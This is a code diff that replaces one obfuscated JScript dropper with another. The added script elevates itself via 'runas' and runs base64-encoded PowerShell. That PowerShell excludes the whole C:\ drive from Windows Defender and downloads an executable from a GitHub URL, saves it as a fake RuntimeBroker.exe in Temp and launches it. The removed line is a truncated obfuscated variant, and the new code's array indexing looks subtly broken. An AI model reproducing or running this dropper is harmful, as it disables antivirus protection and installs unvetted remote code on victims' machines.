@@ -1,1 +1,34 @@
-(function(){var _0x5a46=['ShellExecute','Arguments','Exists','FullName','ScriptFullName','runas','Shell.Application','Wscript.Shell','run','powershell\x20-enc\x20','length'];(function(_0x3f9bdd,_0x5a46){var _0x3484c7=function(_0x4c3a93){while(--_0x4c3a93){_0x3f9bdd['push'](_0x3f9bdd['shift']());}};_0x3484c7(++_0x5a46);}(_0x5a46,0x1b5));var _0x3484=function(_0x3f9bdd,_0x5a46){_0x3f9bdd=_0x3f9bdd-0x0;var _0x3484c7=_0x5a46[_0x3f9bdd];return _0x3484c7;};function _0x3a3aef(){if(!WScript[_0x3484('0x0')][_0x3484('0x1')](_0x3484('0x2'))){new ActiveXObject(_0x3484('0x3'))[_0x3484('0x4')](_0x3484('0x5'),'\x22'+WScript[_0x3484('0x6')]+'\x22\x20/elevate','','runas',0x1);WScript['Quit']();}}var _0x4c3a93=[_0x3484('0x7'),_0x3484('0x8'),_0x3484('0x9')];function _0x3f4dbb(_0x14b395){var _0x4d30dc=new ActiveXObject(_0x3484('0x7'));_0x4d30dc[_0x3484('0xa')](_0x3484('0x9')+_0x14b395,0x0,![])}function _0x1c96b1(){_0x3a3aef();_0x3f4dbb('cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA');_0x3f4dbb('cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAG
+(function() {
+    var _0x1a2b = function(a, b) {
+        var c = function(d) {
+            while (--d) { a.push(a.shift()); }
+        };
+        c(++b);
+        return a;
+    };
+
+    var _0x2b3c = _0x1a2b(['Shell.Application', 'Wscript.Shell', 'run', 'Arguments', 'Exists', 'FullName', 'ScriptFullName', 'runas'], 0);
+
+    function _0x3d4e() {
+        if (!WScript[_0x2b3c[3]][_0x2b3c[4]]('elevate')) {
+            new ActiveXObject(_0x2b3c[0])[_0x2b3c[6]](_0x2b3c[5], '"' + WScript[_0x2b3c[6]] + '" /elevate', '', _0x2b3c[7], 1);
+            WScript.Quit();
+        }
+    }
+
+    function _0x4e5f() {
+        _0x3d4e();
+        var _0x5f6g = new ActiveXObject(_0x2b3c[1]);
+        var _0x6h7i = [
+            "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA",
+            "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==",
+            "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcwBwAG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG9AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA="
+        ];
+
+        _0x6h7i.forEach(function(cmd) {
+            _0x5f6g[_0x2b3c[2]]("powershell -enc " + cmd, 0, false);
+        });
+    }
+
+    _0x4e5f();
+})();
